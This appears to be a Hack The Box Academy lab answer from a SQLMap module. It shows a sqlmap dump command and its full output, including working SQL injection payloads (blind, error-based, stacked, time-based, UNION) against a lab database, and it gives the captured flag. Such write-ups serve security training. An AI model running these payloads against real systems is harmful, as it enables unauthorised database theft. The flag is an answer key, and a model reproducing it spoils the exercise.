# Section 07: Database Emuneration

Module: 18. SQLMap Essentials

---

## Questions & Answers

### 1. What's the contents of table flag1 in the testdb database? (Case #1)

Context:
```bash
┌─[eu-academy-2]─[10.10.15.97]─[htb-ac-2162140@htb-jly8u2dih3-htb-cloud-com]─[~]
└──╼ [★]$ sqlmap -r req1.txt --dump --batch --level=3 --risk=3 -D testdb -T flag1
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.6#stable}
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:26:20 /2026-09-09/

[00:26:20] [INFO] parsing HTTP request from 'req1.txt'
[00:26:20] [INFO] resuming back-end DBMS 'mysql' 
[00:26:20] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 4054=4054

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 1032 FROM(SELECT COUNT(*),CONCAT(0x716b6a6a71,(SELECT (ELT(1032=1032,1))),0x7162767671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id=1;SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 3508 FROM (SELECT(SLEEP(5)))KEuq)

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x716b6a6a71,0x51454678556641564142724350536e4d43436f436d47616e704761766b757862435a444749634350,0x7162767671),NULL,NULL,NULL-- -
---
[00:26:21] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[00:26:21] [INFO] fetching columns for table 'flag1' in database 'testdb'
[00:26:21] [WARNING] potential permission problems detected ('command denied')
[00:26:21] [INFO] fetching entries for table 'flag1' in database 'testdb'
Database: testdb
Table: flag1
[1 entry]
+----+-----------------------------------------------------+
| id | content                                             |
+----+-----------------------------------------------------+
| 1  | HTB{c0n6r475_y0u_kn0w_h0w_70_run_b451c_5qlm4p_5c4n} |
+----+-----------------------------------------------------+

[00:26:21] [INFO] table 'testdb.flag1' dumped to CSV file '/home/htb-ac-2162140/.local/share/sqlmap/output/154.57.164.82/dump/testdb/flag1.csv'
[00:26:21] [INFO] fetched data logged to text files under '/home/htb-ac-2162140/.local/share/sqlmap/output/154.57.164.82'
[00:26:21] [WARNING] your sqlmap version is outdated

[*] ending @ 00:26:21 /2026-09-09/
```

**Answer:** `HTB{c0n6r475_y0u_kn0w_h0w_70_run_b451c_5qlm4p_5c4n}`

---

[Back to Module Index](./README.md)
